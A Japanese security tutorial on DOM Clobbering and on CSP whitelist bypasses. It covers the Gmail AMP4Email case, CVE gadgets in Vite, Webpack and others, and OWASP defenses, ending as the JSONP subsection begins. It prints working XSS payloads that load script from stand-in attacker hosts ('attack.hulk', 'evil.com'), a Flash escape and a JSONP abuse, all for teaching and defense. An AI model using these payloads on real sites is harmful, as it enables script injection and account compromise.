DOM Clobbering(DOMクロバリング)は、`<script>`タグや`javascript:`スキーム、イベントハンドラ属性(`onerror`等)を**一切使わずに**、静的なHTMLマークアップの注入だけでJavaScriptの実行フローを乗っ取る攻撃手法です。日本語で「clobber」は「叩き潰す・上書きする」の意で、その名の通り、既存の正規スクリプトが参照するはずの変数やプロパティを、攻撃者が注入したHTML要素で**すり替える(上書きする)**ところに本質があります。

多くのXSS防御(HTMLサニタイザによる`<script>`除去、CSPの`script-src`制限)は「スクリプトの実行そのものを防ぐ」ことに主眼を置いています。ところがDOM Clobberingは新しいスクリプトを注入しません。**すでにページ上で動いている正規のJavaScript**が参照する値を書き換え、そのコードを「攻撃者の意図した通りに」誤動作させます。したがって、`<a>`や`<form>`、`<img>`といった「無害に見えるタグ」しか許可しないサニタイザ設定を通り抜け、CSPで`<script>`をブロックしていても成立し得ます。研究コミュニティではこの性質から「code-reuse(コード再利用)攻撃」「scriptless(スクリプトなし)injection」とも呼ばれます。

DOM Clobbering Collectionの定義を引用します。

> "DOM Clobbering is a type of code-less injection attack on the web where attackers first inject a seemingly benign, scriptless HTML markup into a webpage."(DOM Clobberingとは、攻撃者がまず一見無害でスクリプトを含まないHTMLマークアップをWebページに注入する、コード無しのインジェクション攻撃の一種である)

本節では、攻撃を成立させるブラウザの中核機構(名前付きプロパティアクセス)を仕組みレベルで解説し、実際に野生で発見された著名な脆弱性(Gmail AMP4Email)、体系化された防御策(OWASP Cheat Sheet)、研究コミュニティが収集した実在ガジェット集(DOM Clobbering Collection)という3つの一次資料をもとに、原理から実践的防御までを一気通貫で扱います。

---

### 仕組みの核心:名前付きプロパティアクセス(Named Property Access)

DOM Clobberingを理解する唯一かつ最大の鍵は、HTML仕様(WHATWG HTML Standard)が定義する「**名前付きプロパティアクセス**」という、極めて古くからある(そして今も互換性のため残っている)ブラウザ挙動です。

ブラウザはDOMツリーを構築するとき、`id`属性、あるいは一部の要素の`name`属性を持つHTML要素について、その属性値を**キー**として`document`オブジェクトや`window`(グローバル)オブジェクトに**自動的にアクセサ(参照)を生やします**。つまり、HTMLを1行書くだけで、対応する名前のグローバル変数・プロパティが勝手に生成されるのです。

OWASP Cheat Sheetの例を引用します。

```html
<form id=x></form>
```

```javascript
// すべて同じ<form>要素を指す:
var obj1 = document.getElementById('x');
var obj2 = document.x;
var obj3 = window.x;
var obj4 = x;            // 明示的な宣言なしにグローバル参照になる
console.log(obj1 === obj2 && obj2 === obj3 && obj3 === obj4); // true
```

**なぜ動くのか。** HTML仕様は、後方互換性(古いWebサイトが`document.formName`のようにフォームへ直接アクセスしていた時代の名残)のために、名前付き要素を`document`/`window`のプロパティとして露出させることを規定しています。ここで決定的に重要なのは、OWASPが強調する次の性質です。

> "named element references take precedence over built-in APIs and developer-defined attributes during property lookups."(名前付き要素の参照は、プロパティ探索時に組み込みAPIや開発者定義の属性よりも優先される)

厳密には、`window`/`document`のプロパティ解決順序において、これらの「名前付きプロパティ」は**そのプロパティがまだ定義されていない(=`undefined`である)場合**に露出します。したがって開発者が「まだ代入していないグローバル変数」や「オプショナルな設定オブジェクト」を前提にコードを書いていると、攻撃者はそこにHTML要素を割り込ませることができます。

`window`側と`document`側で、露出のトリガーとなる属性が異なる点も押さえておきましょう。仕様上、`window`に載るのは主に`id`属性(および`embed`/`form`/`img`/`object`の`name`属性)、`document`に載るのは`embed`/`form`/`iframe`/`img`/`object`等の`name`属性(および`id`)です。この違いが、後述する`document.getElementById`のような**組み込みAPI自体の上書き**に効いてきます。

```html
<img name=cookie>
<embed name=getElementById></embed>
```
```javascript
console.log(document.cookie);         // <img name="cookie"> 要素そのものが返る
console.log(document.getElementById); // <embed name="getElementById"> が返る(関数ではなくなる)
```

> 出典: DOM Clobbering Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
> 出典: Can HTML affect JavaScript? Introduction to DOM clobbering(Beyond XSS / Huli)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/

#### 単純な悪用例:分岐とスクリプトロードの乗っ取り

OWASPが挙げる最小の悪用例を見ます。まず、未定義前提の変数を使った分岐です。

```javascript
let redirectTo = window.redirectTo || '/profile/';
location.assign(redirectTo);
```

開発者の意図は「`window.redirectTo`が設定されていればそこへ、なければ`/profile/`へ」。しかし`window.redirectTo`は通常`undefined`なので、攻撃者が以下を注入すると乗っ取れます。

```html
<a id=redirectTo href='javascript:alert(1)'></a>
<!-- オープンリダイレクトなら: -->
<a id=redirectTo href='phishing.com'></a>
```

**なぜ動くのか。** `<a id=redirectTo>`により`window.redirectTo`は`<a>`要素を指すようになります。`location.assign()`は文字列を期待しますが、要素を渡すと内部で文字列化(`toString()`)されます。`<a>`要素の`toString()`は**その`href`属性の値(解決済みURL)を返す**という特別な挙動を持つため、`javascript:alert(1)`という文字列がそのまま`location.assign`に渡り、スクリプトが実行されます。この「`<a>`/`<area>`の`toString()`が`href`を返す」性質は、DOM Clobberingで**任意の文字列を注入する**ための最重要テクニックです。

次に、より危険なスクリプトの動的ロード乗っ取り。

```javascript
var script = document.createElement('script');
let src = window.config.url || 'script.js';
script.src = src;
document.body.appendChild(script);
```

```html
<a id=config><a id=config name=url href='malicious.js'></a>
```

**なぜ動くのか。** ここでは`window.config`が(存在すれば)`.url`プロパティを持つオブジェクトであることを前提にしています。攻撃者は`config`という「入れ物」と、その中の`url`という「中身」の**2階層**を作らねばなりません。これを実現するのが、次に述べる多階層クロバリングです。

> 出典: DOM Clobbering Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

---

### 多階層クロバリング:`a.b.c`のようなネストしたプロパティを作る

実アプリでは`window.config.url`や`AMP_MODE.test`のように、**ドットで連なる**プロパティ参照が普通です。単一の要素では`window.x`しか作れませんが、次の3つのテクニックで2〜3階層のプロパティ木を「HTMLだけで」構築できます。

#### テクニック1:同一`id`の重複でHTMLCollectionを作る

同じ`id`を持つ要素を複数配置すると、`window.<id>`は単一要素ではなく`HTMLCollection`(要素の集合)になります。`HTMLCollection`は、その中の要素の`name`属性値でメンバーアクセスできるため、疑似的な「2階層目」を作れます。

```html
<a id="config"></a>
<a id="config" name="apiUrl" href="https://example.com"></a>
```
```javascript
console.log(config.apiUrl + '') // "https://example.com"
```

**なぜ動くのか。** `id="config"`が2つあるので`window.config`は`HTMLCollection`になります。`HTMLCollection.apiUrl`は、`name="apiUrl"`を持つメンバー要素(2つめの`<a>`)を返します。その`<a>`を文字列化(`+ ''`)すると`href`値が得られる、という前述の`toString()`挙動の合わせ技です。

#### テクニック2:`<form>` + `<input>`で本物のネストを作る

`<form>`要素は、その内部のフォーム部品(`<input>`等)に`name`でアクセスできる「コンテナ」として振る舞います。これを使うと`config.prod.apiUrl.value`のような**3階層**が作れます。

```html
<form id="config"></form>
<form id="config" name="prod">
  <input name="apiUrl" value="123" />
</form>
```
```javascript
console.log(config.prod.apiUrl.value) // "123"
```

**なぜ動くのか。** `id="config"`が2つ→`window.config`は`HTMLCollection`。`config.prod`は`name="prod"`の2つめの`<form>`。`<form>`はその配下の名前付き部品を露出するので`config.prod.apiUrl`は`<input>`要素、`.value`でその`value`属性値`"123"`が読めます。`<input>.value`は**任意の文字列を格納できる**ため、`href`の`toString`だけでは作りにくい文字列(スペースや特殊文字を含む値)を運ぶのに有用です。

#### テクニック3:`<iframe srcdoc>`でさらに階層を稼ぐ

さらに深い階層や、`window`直下の別名前空間が必要な場合、`<iframe>`の`name`と`srcdoc`(インラインHTML)を組み合わせます。

```html
<iframe name="moreLevel" srcdoc='
  <form id="config"></form>
  <form id="config" name="prod">
    <input name="apiUrl" value="123" />
  </form>
'></iframe>
```
```javascript
setTimeout(() => {
  console.log(moreLevel.config.prod.apiUrl.value) // "123"
}, 500)
```

**なぜ動くのか。** `<iframe name="moreLevel">`により`window.moreLevel`はそのiframeの`contentWindow`を指します。iframe内部のHTMLは`srcdoc`で独立した文書として構築され、その中で作ったクロバリング木に`moreLevel.config.prod...`と外側からたどれます。`setTimeout`で待つのは、iframeの読み込み(内部DOM構築)が非同期だからです。この手法はネストの深さを事実上無制限にできる反面、非同期になる点が実戦での制約になります。

> 出典: Can HTML affect JavaScript? Introduction to DOM clobbering(Beyond XSS)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/

---

### 実戦ケーススタディ:Gmail AMP4Email の XSS(Michał Bentkowski, 2019)

DOM Clobberingが「理論上の面白ネタ」ではなく、Googleが「awesome」と評した実害あるXSSを生むことを示した金字塔的事例が、Michał Bentkowski(Securitum)によるGmailのAMP4Email脆弱性です。

#### 背景:AMP4Emailと、なぜスクリプトが使えないのか

AMP4Email(dynamic mail / 動的メール)は、Gmailのメール本文にインタラクティブなHTMLを埋め込める仕組みです。メールという極めて危険な配信経路でHTMLを許すため、Googleは二重三重の防御を敷いていました。

- **AMPバリデータ**: `<script>`やイベントハンドラ、任意のCSS等を禁止し、AMP独自の許可タグ・属性しか通さない。
- **CSP(Content-Security-Policy)**: 万一スクリプトが紛れ込んでも実行元を制限。

つまり「普通のXSS」は入口で全滅する設計です。Bentkowskiが着目したのは、**バリデータが`id`属性そのものは禁止していなかった**点でした。`id`が使えるなら、DOM Clobberingの土俵に持ち込める――ここから調査が始まります。

#### 突破口:`AMP_MODE`という許可された名前

AMP4EmailはDOM Clobbering対策として、`AMP`など一部の`id`値を禁止していました。しかしBentkowskiは、内部の設定オブジェクト`AMP_MODE`がこの禁止リストから漏れていることを発見します。`<a id=AMP_MODE>`を仕込むと、コンソールに興味深いエラーが現れました。AMPの内部コードが以下のようなパターンでスクリプトのURLを組み立てていたのです(記事で示された、AMPソースに相当するコード)。

```javascript
var script = window.document.createElement("script");
script.async = false;
var loc;
if (AMP_MODE.test && window.testLocation) {
    loc = window.testLocation;
} else {
    loc = window.location;
}
if (AMP_MODE.localDev) {
    loc = loc.protocol + "//" + loc.host + "/dist";
} else {
    loc = "https://cdn.ampproject.org";
}
var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion + "/" + singlePass + "v0/" + pluginName + ".js";
document.head.appendChild(b);
```

`AMP_MODE`が正規のコードで参照されており、しかもその値が**スクリプトのロード先URLの組み立て**に使われている――これはDOM Clobberingにとって理想的なsinkです。

#### メカニズムの分解:URLをどう乗っ取るか

`<a id=AMP_MODE>`だけを置くと、`AMP_MODE`は`<a>`要素になります。すると`AMP_MODE.rtvVersion`は`undefined`となり、URLは次のように壊れます。

```
https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js
```

コンソールに現れた`undefined`は、「攻撃者がこのオブジェクトを掌握できている」動かぬ証拠でした。ここから、URLを完全に攻撃者側へ向けるために2つのフラグを`truthy`(真と評価される値)にし、ロード先(`loc`)を差し替えます。

1. `AMP_MODE.test` を truthy にする → 分岐が`window.testLocation`を見るようになる。
2. `AMP_MODE.localDev` を truthy にする → `loc = loc.protocol + "//" + loc.host + "/dist"` の枝に入る。
3. `window.testLocation` 自体もクロバリングし、その`protocol`(や`host`)を攻撃者URLにする。

これを実現する注入HTMLが以下です。

```html
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>
<a id="testLocation"></a>
<a id="testLocation" name="protocol" href="https://pastebin.com/raw/0tn8z0rG#"></a>
```

**なぜ動くのか(1行ずつ)。**
- `id="AMP_MODE"`が2つ→`window.AMP_MODE`は`HTMLCollection`。
- `AMP_MODE.localDev`は`name="localDev"`の`<a>`要素で、要素オブジェクトは`truthy`。よって`if (AMP_MODE.localDev)`が成立。
- `AMP_MODE.test`も同様に`truthy`。`window.testLocation`も次の要素で存在するので`if (AMP_MODE.test && window.testLocation)`が成立し、`loc = window.testLocation`。
- `id="testLocation"`が2つ→`testLocation`も`HTMLCollection`。`testLocation.protocol`は`name="protocol"`の`<a>`。`loc.protocol`はその`<a>`の`href`の`toString()`で`"https://pastebin.com/raw/0tn8z0rG#"`となる。
- 末尾の`#`は続く`"//" + loc.host + ...`をフラグメント(URLの`#`以降=サーバーに送られない部分)に押し込み、結果としてスクリプトが`https://pastebin.com/...`(攻撃者が中身を制御できるJS)からロードされる。

この一連の流れは、単一要素の`window.x`しか作れないはずのDOM Clobberingで、**多階層プロパティ・truthy分岐の操作・`<a>`の`toString`によるURL文字列注入**という主要テクニックを総動員した好例です。

#### 結末とCSPという最後の壁、そして影響

Bentkowskiはスクリプトのロード先を攻撃者側へ向けることに成功しましたが、**AMP環境のCSP**がロードされるスクリプトの実行元を制限していたため、公開PoCの段階では「完全な任意JS実行」までは至らなかったと各報告は記しています。それでもGoogleはこの発見を高く評価しました。要旨として、**サニタイザとバリデータで固めた"スクリプト禁止"環境が、`id`属性の見落としとDOM Clobbering一つで根底から揺らぐ**ことを証明した点に価値があります。

タイムライン(公開情報):
- 2019年8月15日: Googleへ報告
- 2019年8月16日: 初期受領
- 2019年9月10日: Google「the bug is awesome, thanks for reporting!」
- 2019年10月12日: 修正確認
- 2019年11月18日: 一般公開(報奨金 $5,000)

> ⚠️ **一次資料へのアクセスについて**: 一次資料 `research.securitum.com/xss-in-amp4email-dom-clobbering/`(Bentkowski本人の記事)は現在 `securitum.com` のランディングページへ302リダイレクトされ、本文を直接取得できませんでした。URL: https://research.securitum.com/xss-in-amp4email-dom-clobbering/ 上記の技術的内容は、同記事を精緻に再現しているBeyond XSS(Huli)、および SecurityAffairs / SecurityWeek の報道から復元しています。

> 出典: XSS in GMail's AMP4Email via DOM Clobbering(Michał Bentkowski / Securitum)— https://research.securitum.com/xss-in-amp4email-dom-clobbering/
> 出典: Can HTML affect JavaScript?(Beyond XSS)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/
> 出典: Google addressed an XSS flaw in Gmail defining it awesome(SecurityAffairs)— https://securityaffairs.com/94030/hacking/google-xss-flaw-2.html

---

### 実在ガジェット集:DOM Clobbering Collection

「理屈は分かった。では現実のライブラリにこんな穴が本当にあるのか?」という問いに、jackfromeast と ishmeal が維持する **DOM Clobbering Collection** が答えます。これは、HTMLインジェクションに弱い、あるいはDOM Clobberingガジェット(攻撃者がクロバリングで悪用できる正規コードの断片)を含むクライアントサイドライブラリを体系的にまとめたリポジトリです。

#### 圧倒的に多いパターン:`currentScript` クロバリング

収集された多数のガジェットで、繰り返し登場する最頻出パターンが `document.currentScript` の悪用です。ライブラリは「自分自身がどのURLからロードされたか」を知るために`document.currentScript.src`を読み、そこから相対的に追加のスクリプト/リソースのURLを組み立てることがよくあります。攻撃者は`name="currentScript"`を持つ`<img>`を注入して`document.currentScript`をその要素にすり替え、`src`を攻撃者URLにします。

主要なCVE付き実例(いずれも2024年に採番):

| ライブラリ | バージョン | ペイロード | 影響 | CVE |
|---|---|---|---|---|
| Vite | v5.4.5 | `<img src="https://attack.hulk" name="currentScript">` | XSS | CVE-2024-45812 |
| Webpack | v5.93.0 | `<img name="currentScript" src="https://attack.hulk"></img>` | XSS | CVE-2024-43788 |
| rollup | v4.21.3 | `<img src="https://attack.hulk" name="currentScript">` | XSS | CVE-2024-47068 |
| Prism | v1.29.0 | `<img name="currentScript" src="https://attack.hulk/a.js"></img>` | XSS | CVE-2024-53382 |
| layui | v2.9.16 | `<img name="currentScript" src="https://attack.hulk">` | XSS | CVE-2024-47075 |
| rspack | v1.0.0-rc.0 | `<img name="currentScript" src="https://attack.hulk"></img>` | XSS | CVE-2024-43788 |

**なぜ`<img>`で動くのか。** ライブラリのブートストラップコードは概ね `var src = document.currentScript.src; loadMore(src + '/chunk.js')` のような形をとります。攻撃者のHTMLが本来より先(または適切な位置)に置かれ、`document.currentScript`が`undefined`または上書き可能な状況だと、`name="currentScript"`の`<img>`が返り、その`.src`は`<img>`の`src`属性=攻撃者URLです。結果として後続スクリプトが攻撃者ドメインからロードされXSSに至ります。Vite/Webpack/rollupといった**モダンなフロントエンドの中核ツール**が軒並み該当した事実は、このガジェットが「例外」ではなく「構造的に頻出する」ことを物語ります。

#### 複数要素・a要素id型のガジェット

`currentScript`以外にも、複数`name`同名要素で`scripts`コレクションを作る型や、`<a id=...>`で設定URLを差し込む型があります。

```html
<!-- Astro v4.5.9 (CVE-2024-47885): 同名フォーム2つで scripts を作る -->
<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>

<!-- seajs v3.0.3 (CVE-2024-51091): 同名imgで scripts コレクション -->
<img name="scripts" src="https://attack.hulk"><img name="scripts" src="https://attack.hulk">

<!-- UMeditor v1.2.2 (CVE-2024-53387): a要素idで設定URLを上書き -->
<a id="UMEDITOR_HOME_URL" href="https://attack.hulk/"></a>

<!-- plotly.js v2.35.2: 2階層(HTMLCollection + name)でBASE_URLを注入(CSRF) -->
<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://attack.hulk/?a="></a>

<!-- MathJax v2 (Accepted, XSS): id重複 + name=root -->
<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.hulk"></a>
```

これらはすべて、本節で解説した「HTMLCollection化」「`name`によるメンバーアクセス」「`<a>`の`toString`=`href`」という同一原理の応用です。ペイロードの見た目が違っても、**やっていることは同じ**だと見抜けることが重要です。

#### HTMLインジェクション×サニタイザという別ルート

Collectionはガジェットだけでなく、「ユーザー入力を受け取りHTMLとして出力するが、`id`/`name`属性を残してしまう」ライブラリも列挙しています。注目すべきは、**DOMPurifyを使っていても**該当するケースがある点です。

| ライブラリ | バージョン | サニタイザ | 残る能力 |
|---|---|---|---|
| mermaid | v0.1.4 | DOMPurify | 任意の名前付きプロパティ |
| tui.editor | v3.2.2 | DOMPurify | 任意の名前付きプロパティ |
| TinyMCE v5/6/7 | v7.3.0 | DOMPurify | 任意の名前付きプロパティ |
| Froala | v4.2.2 | DOMPurify | 任意の`name`属性 |

**なぜDOMPurifyでも残るのか。** DOMPurifyはデフォルトでは`id`/`name`属性を「無害な属性」として許可します(危険なのはスクリプト実行系だから)。DOM Clobbering対策は**明示的にオプトインしないと効かない**(後述の`SANITIZE_NAMED_PROPS`)ため、既定設定のまま使うとクロバリング用マークアップが通過してしまいます。これはサニタイザ利用者が最も陥りやすい落とし穴です。

Collectionは学術研究とも接続しています。攻撃手法・実態・防御を体系化した論文 "It's (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses"(Soheil Khodayari, Giancarlo Pellegrino)や、記号的DOMモデリングによる動的解析ツールを提案した "The DOMino Effect"(Zhengyu Liu ほか)、教育資料としてDOM Clobbering Wiki(domclob.xyz)やHuliの記事が参照されています。

> 出典: dom-clobbering-collection(jackfromeast / ishmeal)— https://github.com/jackfromeast/dom-clobbering-collection

---

### 防御:OWASP DOM Clobbering Prevention Cheat Sheet

OWASPは防御を「サニタイズ層」「コーディング層」の二段構えで整理しています。単一の銀の弾丸はなく、**多層防御(defense in depth)**が前提です。

#### 防御1:HTMLサニタイズで`id`/`name`を無害化する

最も直接的なのは、注入されるHTMLの`id`/`name`が既存のグローバル/document/フォームのプロパティと衝突しないようにすることです。

**DOMPurify(名前空間隔離):**
```javascript
var clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});
```
これを有効にすると、DOMPurifyは名前付きプロパティに`user-content-`という接頭辞を付与し、`window.config`のような正規コードの参照とは**別の名前空間**へ隔離します。前述の通り**デフォルトでは無効**なので明示指定が必須です。DOMPurifyの内部では、以下のようなチェックでクロバリングを弾く実装も存在します。

```javascript
if (SANITIZE_DOM &&
    (lcName === 'id' || lcName === 'name') &&
    (value in document || value in formElement)) {
  return false; // documentやformの既存プロパティ名と衝突する id/name を拒否
}
```

**Sanitizer API(属性ブロック):**
```javascript
const sanitizerInstance = new Sanitizer({
  blockAttributes: [
    {'name': 'id', elements: '*'},
    {'name': 'name', elements: '*'}
  ]
});
containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
```
ただしOWASPは、ブラウザ標準のSanitizer APIは**デフォルト状態ではDOM Clobberingを防がない**と明記しています。`id`/`name`を明示的にブロックする設定を自分で加える必要があります。

#### 防御2:CSP(部分的緩和にとどまる)

`script-src`でスクリプトの実行元を厳格に制限すれば、「攻撃者URLからのスクリプトロード」型のガジェット(`currentScript`型など)は緩和できます。ただしOWASPは、CSPは**一部の変種しか防げない**と釘を刺します。AMP4Email事例が示すように、CSPは最後の砦にはなり得ますが、`location.assign`への`javascript:`注入やCSRF型など、スクリプトを新たにロードしない攻撃には無力なこともあります。

#### 防御3:オブジェクトの凍結

```javascript
Object.freeze(sensitiveObject);
```
`Object.freeze`した後は、そのオブジェクトのプロパティを名前付きプロパティで上書きできなくなります。ただし「守るべきオブジェクトを漏れなく列挙する」のは現実には困難、とOWASPは補足しています。

#### 防御4〜13:安全なコーディング規約

サニタイザに頼りきらず、**そもそもクロバリングされない書き方**をすることが根本対策です。OWASPの主要項目を要約します。

- **明示的な変数宣言(#5):** `let redirectTo = '/profile/'` のように、必ず初期値を持つローカル/明示変数を使う。`window.x || default` の「未定義前提」を避ける。
- **document/windowを変数置き場にしない(#6):** アプリの状態をグローバルに載せない。
- **使用前の型チェック(#7, #8):** 名前付きプロパティは常にHTML要素として現れるので、要素かどうかで弾ける。
  ```javascript
  if (typeof window.config === 'object' && window.config instanceof Object) {
    // 安全に使用可
  }
  // あるいは
  let src = (window.config instanceof Object && window.config.url)
    ? window.config.url
    : 'script.js';
  ```
  **なぜ有効か。** クロバリングで注入されるのは`HTMLElement`/`HTMLCollection`です。期待するのが「プレーンなオブジェクト」なら`instanceof`や厳密な型判定でHTML要素を除外できます(ただし要素も`instanceof Object`は真になるため、`instanceof HTMLElement`で明示的に**拒否**する方が確実な場面もあります)。
- **strictモード(#9):** `'use strict'` で暗黙のグローバル生成を禁止し、読み取り専用への代入をエラーにする。
- **フィーチャ検出(#10)/ローカルスコープ優先(#11)/ユニークな変数名(#12):** `__appConfig__`のような衝突しにくい名前や、クロージャによるカプセル化(#13)で露出面を減らす。
  ```javascript
  const AppConfig = (() => {
    const config = {url: 'script.js'};
    return { getUrl: () => config.url };
  })();
  ```
  **なぜ有効か。** クロージャ内のローカル変数は`window`/`document`のプロパティにならないため、名前付きプロパティで到達できません。

> 出典: DOM Clobbering Prevention Cheat Sheet(OWASP)— https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

---

### まとめ:攻撃者・防御者それぞれの視点

DOM Clobberingの本質は、「HTMLとJavaScriptが`window`/`document`の名前付きプロパティを通じて**意図せず接続している**」という、ブラウザの後方互換仕様にあります。攻撃者にとっての着眼点は3つです。

1. **`id`/`name`が通るHTMLインジェクション点**があるか(サニタイザのデフォルト設定が甘くないか)。
2. 正規コードが**未定義前提のグローバル/設定オブジェクト**(`window.config`, `AMP_MODE`, `document.currentScript`等)を参照していないか。
3. その値が**危険なsink**(`script.src`, `location`, `innerHTML`)へ流れていないか。

防御者は逆に、この3点のいずれかを断ちます。サニタイザで`SANITIZE_NAMED_PROPS`を有効化し、`window.x || default`のような書き方を排し、設定はクロージャに閉じ込め、CSPを最後の砦に置く――どれか一つではなく、**すべてを重ねる**ことが、Gmail級の堅牢な環境ですら破られた歴史から得られる教訓です。

---

## CSPの限界（CSP Is Dead 論文）

XSS対策として広く推奨されてきた **CSP（Content Security Policy／コンテンツセキュリティポリシー）** は、「ブラウザに許可リストを宣言し、リストにないスクリプトの実行を拒否させる」多層防御(defense-in-depth)の仕組みです。ところが2016年、Googleのセキュリティチーム（Lukas Weichselbaum、Michele Spagnuolo、Sebastian Lekies、Artur Janc）がACM CCS 2016で発表した論文 **"CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"** は、実際にインターネット上で配信されているCSPポリシーのうち **94.72% が自明に回避可能(trivially bypassable)** であることを、Google検索インデックスを使った大規模実測によって示しました。

本節では、この論文と、同じ著者の一人LukasがDeepSec 2016で行った講演スライド「CSP Is Dead, Long Live Strict CSP!」を主資料として、(1) CSPの脅威モデルの正確な理解、(2) ホワイトリスト方式が構造的に破綻する仕組み、(3) その代替として提案された `'strict-dynamic'` を伴うnonceベースCSP（strict CSP）の設計原理、を順に解説します。読者はこの節を読むことで「CSPがあるからXSSは無害化されている」という前提がなぜ多くの場合に成り立たないのかを、仕組みのレベルで説明できるようになります。

### 前提：CSPは何を守り、何を守らないのか

CSPは `Content-Security-Policy` HTTPレスポンスヘッダ（違反を記録するだけの `Content-Security-Policy-Report-Only` ヘッダ、または `<meta>` 要素）で配信されます。論文はCSPの機能を3つに分類しています。

1. **リソース読み込み制限**: `script-src` / `style-src` / `img-src` / 包括的な `default-src` などのディレクティブで、サブリソースの取得元を「ソースリスト（source list、通称ホワイトリスト）」に限定する。
2. **URLベースの補助的制限**: `frame-ancestors`（クリックジャッキング対策）、`base-uri` と `form-action`（`<base href>` や `<form action>` を悪用するpost-XSS攻撃の緩和）。
3. **その他の封じ込め・堅牢化オプション**: `block-all-mixed-content`、`upgrade-insecure-requests`、`plugin-types`、`sandbox`。

論文のTable 1に挙げられたディレクティブ一覧は `default-src` / `script-src` / `style-src` / `img-src` / `media-src` / `font-src` / `frame-src` / `object-src` / `child-src` / `worker-src` / `manifest-src` です。

重要なのは **脅威モデル** です。論文によればCSPが防げるのはXSS・クリックジャッキング・混在コンテンツ(mixed content)の3種類だけで、しかも「クリックジャッキングは `X-Frame-Options` でほぼ防げており、能動的な混在コンテンツは最近のブラウザが既定でブロックしている」ため、**CSPの実質的な価値はXSS緩和にほぼ集約される**、と結論づけています。そしてXSSを防ぐのは `script-src` と `object-src`（両者が無ければ `default-src`）だけです。

さらに決定的な非対称性があります。

> スクリプトを実行できる攻撃者は、他のすべてのディレクティブの制限を回避できる。

つまり `img-src` や `frame-ancestors` をどれだけ厳しくしても、`script-src` が破られた瞬間にすべて無意味になります。逆に言えば、CSPの評価は「script実行を止められているか」の一点で決まります。

#### script-srcにおける4つの許可方式

ソースリストにはホスト名（`example.org`）、サブドメインを含めるワイルドカード（`*.example.org`）、スキーム（`https:`、`data:`）、そして特殊キーワード `'self'`（現在のドキュメントのオリジン）と `'none'`（空のリスト）を書けます。CSP2以降はパス（`example.org/resources/js/`）も指定できます。加えて `script-src` には以下の4つの制御があります。

1. `'unsafe-inline'` — インライン `<script>` ブロックとイベントハンドラ属性を許可する（**XSS対策としてのCSPを事実上無効化する**）。
2. `'unsafe-eval'` — `eval()`、`setTimeout()`、`setInterval()`、`Function` コンストラクタなど、文字列をコードとして実行するAPIを許可する。
3. **nonce** — `script-src 'nonce-random-value'` と書き、ページ内の `<script nonce="random-value">` だけを実行許可する一回限りのトークン。
4. **hash** — `script-src 'sha256-nGA...'` のように、期待するインラインスクリプトの暗号学的ハッシュを列挙する。

論文が例示する「ロックダウンされたポリシー」（Listing 2）は次の形です。

```
Content-Security-Policy: script-src 'nonce-BPNLMA4' 'sha256-OPc+f+ieuYDM...' object-src 'none';
```

#### 安全なポリシーが満たすべき3条件

論文は「スクリプト実行を防ぐ」ために必要な条件を3つ挙げ、それぞれに対応するバイパス例（Listing 3〜5）を示しています。

**条件1: `script-src` と `object-src` の両方（または `default-src`）を定義していること。**

```html
<script src="//evil.com"></script>

<object data="//evil.com/evil.swf">
  <param name="allowscriptaccess" value="always">
</object>
```

> なぜ動くか: `script-src` だけを書いて `object-src` も `default-src` も書かないと、プラグイン系リソースは無制限になります。Adobe Flashのようなプラグインは埋め込み元ページのコンテキストでJavaScriptを実行できる（`allowscriptaccess=always`）ため、`<object>` 経由で任意スクリプト実行に到達します。DeepSecスライドはこの具体例として、Googleのホストに置かれた実在のYUIチャート用SWFを使うペイロードを示しています。
>
> ```html
> ">'><object type="application/x-shockwave-flash"
> data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//'>
> <param name="AllowScriptAccess" value="always"></object>
> ```
>
> `allowedDomain` パラメータの値がSWF内部で生成されるJavaScriptコードに埋め込まれるため、`\"})))}catch(e){...}//` という文字列でその構文を脱出し、任意のJSを実行できます。

**条件2: `script-src` に（nonceを伴わない）`'unsafe-inline'` や `data:` URIを含めないこと。**

```html
<img src="x" onerror="evil()">

<script src="data:text/javascript,evil()"></script>
```

> なぜ動くか: `'unsafe-inline'` はインラインイベントハンドラ（`onerror=`）を許可するため、注入されたマークアップだけでコードが動きます。`data:` を許可すると、スクリプト本体をURL内に直接埋め込めるので、外部ホストを一切必要とせずに任意コードを読み込めます。DeepSecスライドの `script-src 'self' https: data: *;` はこの両方に該当し、`<script src=https://attacker.com/evil.js>` も `<script src=data:text/javascript,alert(1337)>` も通ります。

**条件3: `script-src` / `object-src` のソースリストに、レスポンスの「セキュリティ上重要な部分」を攻撃者が制御できるエンドポイントや、危険なライブラリを含めないこと。**

```html
<script src="/api/jsonp?callback=evil"></script>

<script src="angular.js"></script> <div ng-app>
{{ executeEvilCodeInUnsafeSandbox() }} </div>
```

この条件3こそが、論文の核心である「ホワイトリストは維持不可能」という主張につながります。

> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/

### ホワイトリストが壊れる4つの仕組み

論文の2.3節は、CSPの暗黙の前提である「ホワイトリストに載せたドメインは安全なコンテンツしか配信しない」が、現実のWebアプリケーションの一般的な実装パターンによって破られることを示します。

#### (1) ユーザ制御のコールバックを持つJavaScript（JSONP）

JSONPは、APIのJSONデータをコールバック関数でラップして返し、`<script>` として読み込ませる古典的なクロスオリジン通信手法です。論文Listing 6:

```html
<script src="/path/jsonp?callback=alert(document.domain)//"></script>
```

